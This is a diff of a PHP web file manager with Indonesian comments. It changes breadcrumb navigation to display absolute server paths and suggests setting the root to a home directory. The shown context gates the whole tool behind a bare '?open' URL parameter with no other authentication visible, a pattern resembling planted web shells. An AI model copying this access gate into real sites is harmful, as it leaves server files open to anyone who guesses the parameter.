@@ -8,7 +8,8 @@ if (!isset($_GET['open'])) {
     die("Akses ditolak. Gunakan ?open untuk mengakses file manager.");
 }
 
-$ROOT_DIR = __DIR__; // direktori dasar
+// Ubah $ROOT_DIR sesuai kebutuhan, misalnya '/home/tutorzoo' jika ingin root dari sana
+$ROOT_DIR = __DIR__; // direktori dasar, ubah ke '/home/tutorzoo' jika diperlukan
 
 function safe_path($root, $path) {
     $real = realpath($root . '/' . $path);
@@ -123,17 +124,22 @@ input[type=text]{max-width:140px}
             <div>
                 <strong class="text-secondary">Path</strong> :
                 <?php
-                $absPath = realpath($currentDir);
-                $rootAbs = realpath($ROOT_DIR);
-                $relPath = str_replace($rootAbs . '/', '', $absPath);
-                if ($relPath === $absPath) $relPath = ''; // jika sama dengan root
-                $parts = explode('/', trim($relPath, '/'));
+                $absPath = $currentDir; // Menggunakan $currentDir sebagai pwd (path absolut)
+                $parts = explode('/', trim($absPath, '/'));
                 $pathBuild = "";
                 echo '<a class="link-primary" href="?open">/</a>';
                 foreach ($parts as $part) {
                     if ($part === "") continue;
                     $pathBuild .= "/$part";
-                    echo ' <a class="link-primary" href="?open&p='.urlencode(trim($pathBuild,'/')).'">'.$part.'</a> /';
+                    // Hitung path relatif dari $ROOT_DIR untuk link navigasi
+                    $rootAbs = realpath($ROOT_DIR);
+                    if (strpos($pathBuild, $rootAbs) === 0) {
+                        $rel = substr($pathBuild, strlen($rootAbs) + 1);
+                        echo ' <a class="link-primary" href="?open&p='.urlencode($rel).'">'.$part.'</a> /';
+                    } else {
+                        // Jika di luar $ROOT_DIR, tampilkan tanpa link
+                        echo ' ' . $part . ' /';
+                    }
                 }
                 ?>
             </div>
